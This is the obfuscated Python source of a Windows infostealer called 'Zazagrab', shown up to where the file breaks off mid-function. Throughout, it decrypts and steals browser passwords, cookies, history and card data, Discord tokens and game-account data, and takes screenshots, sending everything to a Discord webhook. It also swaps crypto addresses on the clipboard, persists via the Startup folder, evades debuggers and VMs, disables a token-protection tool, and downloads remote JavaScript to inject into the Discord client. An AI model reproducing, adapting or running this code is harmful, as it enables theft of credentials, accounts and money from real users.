import asyncio #line:1
import json #line:2
import ntpath #line:3
import os #line:4
import random #line:5
import re #line:6
import shutil #line:7
import sqlite3 #line:8
import subprocess #line:9
import threading #line:10
import winreg #line:11
import zipfile #line:12
import httpx #line:13
import psutil #line:14
import base64 #line:15
import requests #line:16
import ctypes #line:17
import time #line:18
import pyperclip #line:19
import win32gui #line:20
import win32con #line:21
from sqlite3 import connect #line:24
from base64 import b64decode #line:25
from urllib .request import Request ,urlopen #line:26
from shutil import copy2 #line:27
from datetime import datetime ,timedelta ,timezone #line:28
from sys import argv #line:29
from tempfile import gettempdir ,mkdtemp #line:30
from json import loads ,dumps #line:31
from ctypes import windll ,wintypes ,byref ,cdll ,Structure ,POINTER ,c_char ,c_buffer #line:32
from Crypto .Cipher import AES #line:33
from PIL import ImageGrab #line:34
from win32crypt import CryptUnprotectData #line:35
local =os .getenv ('LOCALAPPDATA')#line:38
roaming =os .getenv ('APPDATA')#line:39
temp =os .getenv ("TEMP")#line:40
Passw =[];#line:42
__config__ ={'yourwebhookurl':"%WEBHOOK_HERE%",'zazagrab_inject_url':"https://raw.githubusercontent.com/zazaman4000/zaza-inject/main/index.js",'hide':'%_hide_script%','ping':'%ping_enabled%','pingtype':'%ping_type%','fake_error':'%_error_enabled%','startup':'%_startup_enabled%','kill_discord_process':'%kill_discord_process%','dbugkiller':'%_debugkiller%','addresse_crypto_replacer':'%_address_replacer%','addresse_btc':'%_btc_address%','addresse_eth':'%_eth_address%','addresse_xchain':'%_xchain_address%','addresse_pchain':'%_pchain_address%','addresse_cchain':'%_cchain_address%','addresse_monero':'%_monero_address%','addresse_ada':'%_ada_address%','addresse_dash':'%_dash_address%','blprggg':["httpdebuggerui","wireshark","fiddler","regedit","cmd","taskmgr","vboxservice","df5serv","processhacker","vboxtray","vmtoolsd","vmwaretray","ida64","ollydbg","pestudio","vmwareuser","vgauthservice","vmacthlp","x96dbg","vmsrvc","x32dbg","vmusrvc","prl_cc","prl_tools","xenservice","qemu-ga","joeboxcontrol","ksdumperclient","ksdumper","joeboxserver"]}#line:109
infocom =os .getlogin ()#line:114
vctm_pc =os .getenv ("COMPUTERNAME")#line:115
r4m =str (psutil .virtual_memory ()[0 ]/1024 **3 ).split (".")[0 ]#line:116
d1sk =str (psutil .disk_usage ('/')[0 ]/1024 **3 ).split (".")[0 ]#line:117
Zazagrab_Regex ='https://paste.bingner.com/paste/fhvyp/raw'#line:119
reg_req =requests .get (Zazagrab_Regex )#line:120
clear_reg =r"[\w-]{24}\."+reg_req .text #line:121
class Functions (object ):#line:126
    @staticmethod #line:128
    def gtmk3y (OOOOO000OOO00OO0O :str or os .PathLike ):#line:129
        if not ntpath .exists (OOOOO000OOO00OO0O ):#line:130
            return None #line:131
        with open (OOOOO000OOO00OO0O ,"r",encoding ="utf-8")as OOO0OO0O00OO0O0OO :#line:132
            O0OO000O0O0000OO0 =OOO0OO0O00OO0O0OO .read ()#line:133
        OOOOOO00O00000O0O =json .loads (O0OO000O0O0000OO0 )#line:134
        try :#line:136
            O0000OOO00O000O0O =b64decode (OOOOOO00O00000O0O ["os_crypt"]["encrypted_key"])#line:137
            return Functions .w1nd0_dcr (O0000OOO00O000O0O [5 :])#line:138
        except KeyError :#line:139
            return None #line:140
    @staticmethod #line:142
    def cnverttim (O00O0OOOOO0O00O00 :int or float )->str :#line:143
        try :#line:144
            OO0OO0O0OOO0OOO00 =datetime (1601 ,1 ,1 ,tzinfo =timezone .utc )#line:145
            OOO00OOO0O0O000OO =OO0OO0O0OOO0OOO00 +timedelta (microseconds =O00O0OOOOO0O00O00 )#line:146
            return OOO00OOO0O0O000OO #line:147
        except Exception :#line:148
            pass #line:149
    @staticmethod #line:151
    def w1nd0_dcr (O0OOO0O0OO0O0O0O0 :bytes )->str :#line:152
        return CryptUnprotectData (O0OOO0O0OO0O0O0O0 ,None ,None ,None ,0 )[1 ]#line:153
    @staticmethod #line:155
    def cr34t3_f1lkes (_dir :str or os .PathLike =gettempdir ()):#line:156
        OO0000O0O0OOOO00O =''.join (random .SystemRandom ().choice ('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789')for _O0O0OOOO00000OOO0 in range (random .randint (10 ,20 )))#line:157
        OOOOO000O0O0O0O00 =ntpath .join (_dir ,OO0000O0O0OOOO00O )#line:158
        open (OOOOO000O0O0O0O00 ,"x")#line:159
        return OOOOO000O0O0O0O00 #line:160
    @staticmethod #line:162
    def dcrpt_val (OO0OOO0OO0OO0000O ,O0OO00O00O000O000 )->str :#line:163
        try :#line:164
            O00000000OO00OO00 =OO0OOO0OO0OO0000O [3 :15 ]#line:165
            OOO0OOOO00O00000O =OO0OOO0OO0OO0000O [15 :]#line:166
            O0O0OO000OO0OOO0O =AES .new (O0OO00O00O000O000 ,AES .MODE_GCM ,O00000000OO00OO00 )#line:167
            OOO000000000OOO0O =O0O0OO000OO0OOO0O .decrypt (OOO0OOOO00O00000O )#line:168
            OOO000000000OOO0O =OOO000000000OOO0O [:-16 ].decode ()#line:169
            return OOO000000000OOO0O #line:170
        except Exception :#line:171
            return f'Failed to decrypt "{str(OO0OOO0OO0OO0000O)}" | key: "{str(O0OO00O00O000O000)}"'#line:172
    @staticmethod #line:174
    def g3t_H (token :str =None ):#line:175
        OO0O00000OO0O0OOO ={"Content-Type":"application/json",}#line:178
        if token :#line:179
            OO0O00000OO0O0OOO .update ({"Authorization":token })#line:180
        return OO0O00000OO0O0OOO #line:181
    @staticmethod #line:183
    def sys_1fo ()->list :#line:184
        O0000OOO0O0OO00O0 =0x08000000 #line:185
        O0OOOOOO000O0O0OO ="wmic csproduct get uuid"#line:186
        OO0OOO0OO000OOOO0 ="powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault"#line:187
        O0O000OO0O0OOO0O0 ="powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName"#line:188
        try :#line:189
            OO0OOOOOO0OOO00OO =subprocess .check_output (O0OOOOOO000O0O0OO ,creationflags =O0000OOO0O0OO00O0 ).decode ().split ('\n')[1 ].strip ()#line:190
        except Exception :#line:191
            OO0OOOOOO0OOO00OO ="N/A"#line:192
        try :#line:193
            OOO0O000OO0OOO00O =subprocess .check_output (OO0OOO0OO000OOOO0 ,creationflags =O0000OOO0O0OO00O0 ).decode ().rstrip ()#line:194
        except Exception :#line:195
            OOO0O000OO0OOO00O ="N/A"#line:196
        try :#line:197
            O00000OO0000O0O0O =subprocess .check_output (O0O000OO0O0OOO0O0 ,creationflags =O0000OOO0O0OO00O0 ).decode ().rstrip ()#line:198
        except Exception :#line:199
            O00000OO0000O0O0O ="N/A"#line:200
        return [OO0OOOOOO0OOO00OO ,O00000OO0000O0O0O ,OOO0O000OO0OOO00O ]#line:201
    @staticmethod #line:204
    def net_1fo ()->list :#line:205
        O0O0OO00OOO000OO0 ,O00OOO0000O00OO0O ,OOO0OOOOO00O00O00 ,OO0OO0O00OO0O0OOO ,OO000OO0OOOO0OOO0 ,O00OOO00O0O000000 ,OOOOOOO000O00O00O ="None","None","None","None","None","None","None"#line:206
        O0OOO0OO0OOOOOO00 =httpx .get ("https://ipinfo.io/json")#line:207
        if O0OOO0OO0OOOOOO00 .status_code ==200 :#line:208
            O0000O00OO0O000OO =O0OOO0OO0OOOOOO00 .json ()#line:209
            O0O0OO00OOO000OO0 =O0000O00OO0O000OO .get ('ip')#line:210
            O00OOO0000O00OO0O =O0000O00OO0O000OO .get ('city')#line:211
            OOO0OOOOO00O00O00 =O0000O00OO0O000OO .get ('country')#line:212
            OO0OO0O00OO0O0OOO =O0000O00OO0O000OO .get ('region')#line:213
            OO000OO0OOOO0OOO0 =O0000O00OO0O000OO .get ('org')#line:214
            O00OOO00O0O000000 =O0000O00OO0O000OO .get ('loc')#line:215
            OOOOOOO000O00O00O ="https://www.google.com/maps/search/google+map++"+O00OOO00O0O000000 #line:216
        return [O0O0OO00OOO000OO0 ,O00OOO0000O00OO0O ,OOO0OOOOO00O00O00 ,OO0OO0O00OO0O0OOO ,OO000OO0OOOO0OOO0 ,O00OOO00O0O000000 ,OOOOOOO000O00O00O ]#line:217
    @staticmethod #line:219
    def fetch_conf (O00OO00O00OO0O0O0 :str )->str or bool |None :#line:220
        return __config__ .get (O00OO00O00OO0O0O0 )#line:221
class auto_copy_wallet (Functions ):#line:232
    def __init__ (OOOOOOO00000OO00O ):#line:233
        OOOOOOO00000OO00O .address_st3aler =OOOOOOO00000OO00O .fetch_conf ("addresse_crypto_replacer")#line:234
        OOOOOOO00000OO00O .address_btc =OOOOOOO00000OO00O .fetch_conf ("addresse_btc")#line:235
        OOOOOOO00000OO00O .address_eth =OOOOOOO00000OO00O .fetch_conf ("addresse_eth")#line:236
        OOOOOOO00000OO00O .address_xchain =OOOOOOO00000OO00O .fetch_conf ("addresse_xchain")#line:237
        OOOOOOO00000OO00O .address_pchain =OOOOOOO00000OO00O .fetch_conf ("addresse_pchain")#line:238
        OOOOOOO00000OO00O .address_cchain =OOOOOOO00000OO00O .fetch_conf ("addresse_cchain")#line:239
        OOOOOOO00000OO00O .address_monero =OOOOOOO00000OO00O .fetch_conf ("addresse_monero")#line:240
        OOOOOOO00000OO00O .address_ada =OOOOOOO00000OO00O .fetch_conf ("addresse_ada")#line:241
        OOOOOOO00000OO00O .address_dash =OOOOOOO00000OO00O .fetch_conf ("addresse_dash")#line:242
    def address_swap (OO000OOOOO0O0OOOO ):#line:245
        try :#line:246
            O00OOO0000000OO0O =pyperclip .paste ()#line:247
            if re .search ('^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$',O00OOO0000000OO0O ):#line:248
                if O00OOO0000000OO0O not in [OO000OOOOO0O0OOOO .address_btc ,OO000OOOOO0O0OOOO .address_eth ,OO000OOOOO0O0OOOO .address_xchain ,OO000OOOOO0O0OOOO .address_pchain ,OO000OOOOO0O0OOOO .address_cchain ,OO000OOOOO0O0OOOO .address_monero ,OO000OOOOO0O0OOOO .address_ada ,OO000OOOOO0O0OOOO .address_dash ]:#line:249
                    if OO000OOOOO0O0OOOO .address_btc !="none":#line:250
                        pyperclip .copy (OO000OOOOO0O0OOOO .address_btc )#line:251
                        pyperclip .paste ()#line:252
            if re .search ('^0x[a-fA-F0-9]{40}$',O00OOO0000000OO0O ):#line:254
                pyperclip .copy (OO000OOOOO0O0OOOO .address_eth )#line:255
                pyperclip .paste ()#line:256
            if re .search ('^([X]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$',O00OOO0000000OO0O ):#line:258
                if OO000OOOOO0O0OOOO .address_xchain !="none":#line:259
                    if O00OOO0000000OO0O not in [OO000OOOOO0O0OOOO .address_btc ,OO000OOOOO0O0OOOO .address_eth ,OO000OOOOO0O0OOOO .address_xchain ,OO000OOOOO0O0OOOO .address_pchain ,OO000OOOOO0O0OOOO .address_cchain ,OO000OOOOO0O0OOOO .address_monero ,OO000OOOOO0O0OOOO .address_ada ,OO000OOOOO0O0OOOO .address_dash ]:#line:260
                        pyperclip .copy (OO000OOOOO0O0OOOO .address_xchain )#line:261
                        pyperclip .paste ()#line:262
            if re .search ('^([P]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$',O00OOO0000000OO0O ):#line:265
                if OO000OOOOO0O0OOOO .address_pchain !="none":#line:266
                    if O00OOO0000000OO0O not in [OO000OOOOO0O0OOOO .address_btc ,OO000OOOOO0O0OOOO .address_eth ,OO000OOOOO0O0OOOO .address_xchain ,OO000OOOOO0O0OOOO .address_pchain ,OO000OOOOO0O0OOOO .address_cchain ,OO000OOOOO0O0OOOO .address_monero ,OO000OOOOO0O0OOOO .address_ada ,OO000OOOOO0O0OOOO .address_dash ]:#line:267
                        pyperclip .copy (OO000OOOOO0O0OOOO .address_pchain )#line:268
                        pyperclip .paste ()#line:269
            if re .search ('^([C]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$',O00OOO0000000OO0O ):#line:272
                if OO000OOOOO0O0OOOO .address_cchain !="none":#line:273
                    if O00OOO0000000OO0O not in [OO000OOOOO0O0OOOO .address_btc ,OO000OOOOO0O0OOOO .address_eth ,OO000OOOOO0O0OOOO .address_xchain ,OO000OOOOO0O0OOOO .address_pchain ,OO000OOOOO0O0OOOO .address_cchain ,OO000OOOOO0O0OOOO .address_monero ,OO000OOOOO0O0OOOO .address_ada ,OO000OOOOO0O0OOOO .address_dash ]:#line:274
                        pyperclip .copy (OO000OOOOO0O0OOOO .address_cchain )#line:275
                        pyperclip .paste ()#line:276
            if re .search ('addr1[a-z0-9]+',O00OOO0000000OO0O ):#line:279
                    if O00OOO0000000OO0O not in [OO000OOOOO0O0OOOO .address_btc ,OO000OOOOO0O0OOOO .address_eth ,OO000OOOOO0O0OOOO .address_xchain ,OO000OOOOO0O0OOOO .address_pchain ,OO000OOOOO0O0OOOO .address_cchain ,OO000OOOOO0O0OOOO .address_monero ,OO000OOOOO0O0OOOO .address_ada ,OO000OOOOO0O0OOOO .address_dash ]:#line:280
                        pyperclip .copy (OO000OOOOO0O0OOOO .address_ada )#line:281
                        pyperclip .paste ()#line:282
            if re .search ('/X[1-9A-HJ-NP-Za-km-z]{33}$/g',O00OOO0000000OO0O ):#line:284
                if OO000OOOOO0O0OOOO .address_dash !="none":#line:285
                    if O00OOO0000000OO0O not in [OO000OOOOO0O0OOOO .address_btc ,OO000OOOOO0O0OOOO .address_eth ,OO000OOOOO0O0OOOO .address_xchain ,OO000OOOOO0O0OOOO .address_pchain ,OO000OOOOO0O0OOOO .address_cchain ,OO000OOOOO0O0OOOO .address_monero ,OO000OOOOO0O0OOOO .address_ada ,OO000OOOOO0O0OOOO .address_dash ]:#line:286
                        pyperclip .copy (OO000OOOOO0O0OOOO .address_dash )#line:287
                        pyperclip .paste ()#line:288
            if re .search ('/4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$/g',O00OOO0000000OO0O ):#line:290
                if OO000OOOOO0O0OOOO .address_monero !="none":#line:291
                    if O00OOO0000000OO0O not in [OO000OOOOO0O0OOOO .address_btc ,OO000OOOOO0O0OOOO .address_eth ,OO000OOOOO0O0OOOO .address_xchain ,OO000OOOOO0O0OOOO .address_pchain ,OO000OOOOO0O0OOOO .address_cchain ,OO000OOOOO0O0OOOO .address_monero ,OO000OOOOO0O0OOOO .address_ada ,OO000OOOOO0O0OOOO .address_dash ]:#line:292
                        pyperclip .copy (OO000OOOOO0O0OOOO .address_monero )#line:293
                        pyperclip .paste ()#line:294
        except :#line:297
            O0OOO0OOO0OO000OO =None #line:298
    def loop_through (O0OOO0O0OOO0OO00O ):#line:301
        while True :#line:303
            O0OOO0O0OOO0OO00O .address_swap ()#line:304
    def run (OOO00000O00000OO0 ):#line:306
        if OOO00000O00000OO0 .address_st3aler =="yes":#line:307
            OOO00000O00000OO0 .loop_through ()#line:308
class zg_initial_func (Functions ):#line:311
    def __init__ (OOO0OO0OO0O0000OO ):#line:312
        OOO0OO0OO0O0000OO .dscap1 ="https://discord.com/api/v9/users/@me"#line:314
        OOO0OO0OO0O0000OO .discord_webhook =OOO0OO0OO0O0000OO .fetch_conf ('yourwebhookurl')#line:316
        OOO0OO0OO0O0000OO .hide =OOO0OO0OO0O0000OO .fetch_conf ("hide")#line:318
        OOO0OO0OO0O0000OO .pingtype =OOO0OO0OO0O0000OO .fetch_conf ("pingtype")#line:320
        OOO0OO0OO0O0000OO .pingonrun =OOO0OO0OO0O0000OO .fetch_conf ("ping")#line:322
        OOO0OO0OO0O0000OO .baseurl ="https://discord.com/api/v9/users/@me"#line:324
        OOO0OO0OO0O0000OO .startupexe =OOO0OO0OO0O0000OO .fetch_conf ("startup")#line:326
        OOO0OO0OO0O0000OO .fake_error =OOO0OO0OO0O0000OO .fetch_conf ("fake_error")#line:328
        OOO0OO0OO0O0000OO .appdata =os .getenv ("localappdata")#line:330
        OOO0OO0OO0O0000OO .roaming =os .getenv ("appdata")#line:332
        OOO0OO0OO0O0000OO .chrmmuserdtt =ntpath .join (OOO0OO0OO0O0000OO .appdata ,'Google','Chrome','User Data')#line:334
        OOO0OO0OO0O0000OO .dir ,OOO0OO0OO0O0000OO .temp =mkdtemp (),gettempdir ()#line:336
        OO0O0O00O0O00O00O ,OO00000O0O0O000OO =OOO0OO0OO0O0000OO .sys_1fo (),OOO0OO0OO0O0000OO .net_1fo ()#line:338
        OOO0OO0OO0O0000OO .uuidwndz ,OOO0OO0OO0O0000OO .w1nv3r ,OOO0OO0OO0O0000OO .w1nk33y =OO0O0O00O0O00O00O [0 ],OO0O0O00O0O00O00O [1 ],OO0O0O00O0O00O00O [2 ]#line:340
        OOO0OO0OO0O0000OO .ip ,OOO0OO0OO0O0000OO .city ,OOO0OO0OO0O0000OO .country ,OOO0OO0OO0O0000OO .region ,OOO0OO0OO0O0000OO .org ,OOO0OO0OO0O0000OO .loc ,OOO0OO0OO0O0000OO .googlemap =OO00000O0O0O000OO [0 ],OO00000O0O0O000OO [1 ],OO00000O0O0O000OO [2 ],OO00000O0O0O000OO [3 ],OO00000O0O0O000OO [4 ],OO00000O0O0O000OO [5 ],OO00000O0O0O000OO [6 ]#line:342
        OOO0OO0OO0O0000OO .srtupl0c =ntpath .join (OOO0OO0OO0O0000OO .roaming ,'Microsoft','Windows','Start Menu','Programs','Startup')#line:344
        OOO0OO0OO0O0000OO .regex_webhook_dsc ="api/webhooks"#line:346
        OOO0OO0OO0O0000OO .chrmrgx =re .compile (r'(^profile\s\d*)|default|(guest profile$)',re .IGNORECASE |re .MULTILINE );#line:348
        OOO0OO0OO0O0000OO .baseurl ="https://discord.com/api/v9/users/@me"#line:350
        OOO0OO0OO0O0000OO .regex =clear_reg #line:352
        OOO0OO0OO0O0000OO .encrypted_regex =r"dQw4w9WgXcQ:[^\"]*"#line:354
        OOO0OO0OO0O0000OO .tokens =[]#line:356
        OOO0OO0OO0O0000OO .zg_id =[]#line:358
        OOO0OO0OO0O0000OO .sep =os .sep ;#line:360
        OOO0OO0OO0O0000OO .robloxcookies =[];#line:362
        OOO0OO0OO0O0000OO .chrome_key =OOO0OO0OO0O0000OO .gtmk3y (ntpath .join (OOO0OO0OO0O0000OO .chrmmuserdtt ,"Local State"));#line:364
        os .makedirs (OOO0OO0OO0O0000OO .dir ,exist_ok =True );#line:367
    def error_remote (OO0OO0O000000OOOO :str )->str :#line:373
        if OO0OO0O000000OOOO .fake_error =="yes":#line:374
            ctypes .windll .user32 .MessageBoxW (None ,'Error code: Windows_0x988958\nSomething gone wrong.','Fatal Error',0 )#line:375
    def ping_on_running (O00O0O0O00OOO0O00 :str )->str :#line:377
        OOO0O0O0OOOO0O0OO ={'avatar_url':'https://raw.githubusercontent.com/zazaman4000/zazagrab-assets/main/zazagrabber-low-resolution-color-logo.png','content':"@everyone"}#line:381
        OOOO0O00O00OOO00O ={'avatar_url':'https://raw.githubusercontent.com/zazaman4000/zazagrab-assets/main/zazagrabber-low-resolution-color-logo.png','content':"@here"}#line:385
        if O00O0O0O00OOO0O00 .pingonrun =="yes":#line:386
            if O00O0O0O00OOO0O00 .regex_webhook_dsc in O00O0O0O00OOO0O00 .discord_webhook :#line:387
                if O00O0O0O00OOO0O00 .pingtype =="@everyone"or O00O0O0O00OOO0O00 .pingtype =="everyone":#line:388
                    httpx .post (O00O0O0O00OOO0O00 .discord_webhook ,json =OOO0O0O0OOOO0O0OO )#line:389
            if O00O0O0O00OOO0O00 .pingtype =="@here"or O00O0O0O00OOO0O00 .pingtype =="here":#line:390
                if O00O0O0O00OOO0O00 .regex_webhook_dsc in O00O0O0O00OOO0O00 .discord_webhook :#line:391
                    httpx .post (O00O0O0O00OOO0O00 .discord_webhook ,json =OOOO0O00O00OOO00O )#line:392
    def startupzazagrab (OO000O00O000O00O0 :str )->str :#line:396
        if OO000O00O000O00O0 .startupexe =="yes":#line:397
            O0O0OO0O0000OO0OO =os .getenv ("appdata")+"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"#line:398
            if os .path .exists (O0O0OO0O0000OO0OO +argv [0 ]):#line:399
                os .remove (O0O0OO0O0000OO0OO +argv [0 ])#line:400
                copy2 (argv [0 ],O0O0OO0O0000OO0OO )#line:401
            else :#line:402
                copy2 (argv [0 ],O0O0OO0O0000OO0OO )#line:403
    def hidethis (O0OOOOOOOO000O0OO :str )->str :#line:407
        if O0OOOOOOOO000O0OO .hide =="yes":#line:408
            OO0OO0OOO000OOOOO =win32gui .GetForegroundWindow ()#line:409
            win32gui .ShowWindow (OO0OO0OOO000OOOOO ,win32con .SW_HIDE )#line:410
    def zg_exit_this (O0OOOO000OO0OOOOO ):#line:415
        shutil .rmtree (O0OOOO000OO0OOOOO .dir ,ignore_errors =True )#line:416
        os ._exit (0 )#line:417
    def extract_try (O000O0OOO0O0O0O0O ):#line:419
        ""#line:420
        def OO0O0OO0OOOOOOOOO (*O0000OOOOOOO000OO ,**O0O0OOOOO0O0OO000 ):#line:421
            try :#line:422
                O000O0OOO0O0O0O0O (*O0000OOOOOOO000OO ,**O0O0OOOOO0O0OO000 )#line:423
            except Exception :#line:424
                pass #line:425
        return OO0O0OO0OOOOOOOOO #line:426
    async def init (OOO0O0O0OO00OO00O ):#line:428
        OOO0O0O0OO00OO00O .browsers ={'amigo':OOO0O0O0OO00OO00O .appdata +'\\Amigo\\User Data','torch':OOO0O0O0OO00OO00O .appdata +'\\Torch\\User Data','kometa':OOO0O0O0OO00OO00O .appdata +'\\Kometa\\User Data','orbitum':OOO0O0O0OO00OO00O .appdata +'\\Orbitum\\User Data','cent-browser':OOO0O0O0OO00OO00O .appdata +'\\CentBrowser\\User Data','7star':OOO0O0O0OO00OO00O .appdata +'\\7Star\\7Star\\User Data','sputnik':OOO0O0O0OO00OO00O .appdata +'\\Sputnik\\Sputnik\\User Data','vivaldi':OOO0O0O0OO00OO00O .appdata +'\\Vivaldi\\User Data','google-chrome-sxs':OOO0O0O0OO00OO00O .appdata +'\\Google\\Chrome SxS\\User Data','google-chrome':OOO0O0O0OO00OO00O .appdata +'\\Google\\Chrome\\User Data','epic-privacy-browser':OOO0O0O0OO00OO00O .appdata +'\\Epic Privacy Browser\\User Data','microsoft-edge':OOO0O0O0OO00OO00O .appdata +'\\Microsoft\\Edge\\User Data','uran':OOO0O0O0OO00OO00O .appdata +'\\uCozMedia\\Uran\\User Data','yandex':OOO0O0O0OO00OO00O .appdata +'\\Yandex\\YandexBrowser\\User Data','brave':OOO0O0O0OO00OO00O .appdata +'\\BraveSoftware\\Brave-Browser\\User Data','iridium':OOO0O0O0OO00OO00O .appdata +'\\Iridium\\User Data','edge':OOO0O0O0OO00OO00O .appdata +"\\Microsoft\\Edge\\User Data"}#line:448
        OOO0O0O0OO00OO00O .profiles =['Default','Profile 1','Profile 2','Profile 3','Profile 4','Profile 5',]#line:456
        if OOO0O0O0OO00OO00O .discord_webhook ==""or OOO0O0O0OO00OO00O .discord_webhook =="\x57EBHOOK_HERE":#line:458
            OOO0O0O0OO00OO00O .zg_exit_this ()#line:459
        OOO0O0O0OO00OO00O .hidethis ()#line:461
        OOO0O0O0OO00OO00O .error_remote ()#line:462
        OOO0O0O0OO00OO00O .startupzazagrab ()#line:463
        if OOO0O0O0OO00OO00O .fetch_conf ('dbugkiller')and NoDebugg ().inVM is True :#line:465
            OOO0O0O0OO00OO00O .zg_exit_this ()#line:466
        await OOO0O0O0OO00OO00O .bypass_bttdsc ()#line:467
        await OOO0O0O0OO00OO00O .bypass_tokenprtct ()#line:468
        OOOO000O0O000OOO0 =[OOO0O0O0OO00OO00O .steal_screen ,OOO0O0O0OO00OO00O .system_informations ,OOO0O0O0OO00OO00O .steal_token ,OOO0O0O0OO00OO00O .grabb_mc ,OOO0O0O0OO00OO00O .grabb_roblox ]#line:470
        if OOO0O0O0OO00OO00O .fetch_conf ('kill_discord_process'):#line:473
            await OOO0O0O0OO00OO00O .kill_process_id ()#line:475
        os .makedirs (ntpath .join (OOO0O0O0OO00OO00O .dir ,'Browsers'),exist_ok =True )#line:479
        for OO000OOOOO00OO00O ,OOOOO0OOO0O0O0O0O in OOO0O0O0OO00OO00O .browsers .items ():#line:480
            if not os .path .isdir (OOOOO0OOO0O0O0O0O ):#line:481
                continue #line:482
            OOO0O0O0OO00OO00O .masterkey =OOO0O0O0OO00OO00O .gtmk3y (OOOOO0OOO0O0O0O0O +'\\Local State')#line:484
            OOO0O0O0OO00OO00O .funcs =[OOO0O0O0OO00OO00O .steal_cookies2 ,OOO0O0O0OO00OO00O .steal_history2 ,OOO0O0O0OO00OO00O .steal_passwords2 ,OOO0O0O0OO00OO00O .steal_cc2 ]#line:490
            for O000OO0OO000OO000 in OOO0O0O0OO00OO00O .profiles :#line:492
                for O0OOO0O00OO0OOOO0 in OOO0O0O0OO00OO00O .funcs :#line:493
                    try :#line:494
                        O0OOO0O00OO0OOOO0 (OO000OOOOO00OO00O ,OOOOO0OOO0O0O0O0O ,O000OO0OO000OO000 )#line:495
                    except :#line:496
                        pass #line:497
        if ntpath .exists (OOO0O0O0OO00OO00O .chrmmuserdtt )and OOO0O0O0OO00OO00O .chrome_key is not None :#line:499
            os .makedirs (ntpath .join (OOO0O0O0OO00OO00O .dir ,'Google'),exist_ok =True )#line:500
            OOOO000O0O000OOO0 .extend ([OOO0O0O0OO00OO00O .steal_passwords ,OOO0O0O0OO00OO00O .steal_cookies ,OOO0O0O0OO00OO00O .steal_history ])#line:501
        for O0OOO0O00OO0OOOO0 in OOOO000O0O000OOO0 :#line:503
            OO0O00O0O0O00O0O0 =threading .Thread (target =O0OOO0O00OO0OOOO0 ,daemon =True )#line:504
            OO0O00O0O0O00O0O0 .start ()#line:505
        for OO0OOO000OOOO0O0O in threading .enumerate ():#line:506
            try :#line:507
                OO0OOO000OOOO0O0O .join ()#line:508
            except RuntimeError :#line:509
                continue #line:510
        OOO0O0O0OO00OO00O .natify_matched_tokens ()#line:511
        await OOO0O0O0OO00OO00O ._inject_disc ()#line:512
        OOO0O0O0OO00OO00O .ping_on_running ()#line:513
        OOO0O0O0OO00OO00O .finished_zg ()#line:514
    async def _inject_disc (OO000O0OOOO0OOO0O ):#line:518
        for _OO00000OOOOOO0O00 in os .listdir (OO000O0OOOO0OOO0O .appdata ):#line:520
            if 'discord'in _OO00000OOOOOO0O00 .lower ():#line:522
                O0OOOOOOOO0000O00 =OO000O0OOOO0OOO0O .appdata +os .sep +_OO00000OOOOOO0O00 #line:523
                for __OO00O00OO0O0O0000 in os .listdir (ntpath .abspath (O0OOOOOOOO0000O00 )):#line:524
                    if re .match (r'app-(\d*\.\d*)*',__OO00O00OO0O0O0000 ):#line:526
                        OO0O000000OOO000O =ntpath .abspath (ntpath .join (O0OOOOOOOO0000O00 ,__OO00O00OO0O0O0000 ))#line:527
                        O0OOO00OO0O0O0OOO =ntpath .join (OO0O000000OOO000O ,'modules')#line:528
                        if not ntpath .exists (O0OOO00OO0O0O0OOO ):#line:531
                            return #line:532
                        for __O0OOOO000OOOOO000 in os .listdir (O0OOO00OO0O0O0OOO ):#line:535
                            if re .match (r"discord_desktop_core-\d+",__O0OOOO000OOOOO000 ):#line:537
                                O00000OOOO0OO0O00 =O0OOO00OO0O0O0OOO +os .sep +__O0OOOO000OOOOO000 +f'\\discord_desktop_core\\'#line:538
                                if ntpath .exists (O00000OOOO0OO0O00 ):#line:540
                                    if OO000O0OOOO0OOO0O .srtupl0c not in argv [0 ]:#line:542
                                        try :#line:543
                                            os .makedirs (O00000OOOO0OO0O00 +'zazagrab',exist_ok =True )#line:544
                                        except PermissionError :#line:545
                                            pass #line:546
                                    if OO000O0OOOO0OOO0O .regex_webhook_dsc in OO000O0OOOO0OOO0O .discord_webhook :#line:548
                                        OOOO00O00OOOO0O00 =httpx .get (OO000O0OOOO0OOO0O .fetch_conf ('zazagrab_inject_url')).text .replace ("%WEBHOOK%",OO000O0OOOO0OOO0O .discord_webhook )#line:550
                                    try :#line:552
                                        with open (O00000OOOO0OO0O00 +'index.js','w',errors ="ignore")as OOOO000O00OOO000O :#line:553
                                            OOOO000O00OOO000O .write (OOOO00O00OOOO0O00 )#line:554
                                    except PermissionError :#line:555
                                        pass #line:556
                                    if OO000O0OOOO0OOO0O .fetch_conf ('kill_discord_process'):#line:558
                                        os .startfile (OO0O000000OOO000O +OO000O0OOOO0OOO0O .sep +_OO00000OOOOOO0O00 +'.exe')#line:559
    async def bypass_tokenprtct (O0OOO0OO000O00O0O ):#line:561
        O0O0O0OO00O0O0OO0 =f"{O0OOO0OO000O00O0O.roaming}\\DiscordTokenProtector\\"#line:562
        if not ntpath .exists (O0O0O0OO00O0O0OO0 ):#line:563
            return #line:564
        OOOOO00OO0OO0OOOO =O0O0O0OO00O0O0OO0 +"config.json"#line:565
        for O00OO000O00OO0OOO in ["DiscordTokenProtector.exe","ProtectionPayload.dll","secure.dat"]:#line:567
            try :#line:568
                os .remove (O0O0O0OO00O0O0OO0 +O00OO000O00OO0OOO )#line:569
            except FileNotFoundError :#line:570
                pass #line:571
        if ntpath .exists (OOOOO00OO0OO0OOOO ):#line:572
            with open (OOOOO00OO0OO0OOOO ,errors ="ignore")as OO0O0O0OOOOO00000 :#line:573
                try :#line:574
                    O00OOO0O0000OOO00 =json .load (OO0O0O0OOOOO00000 )#line:575
                except json .decoder .JSONDecodeError :#line:576
                    return #line:577
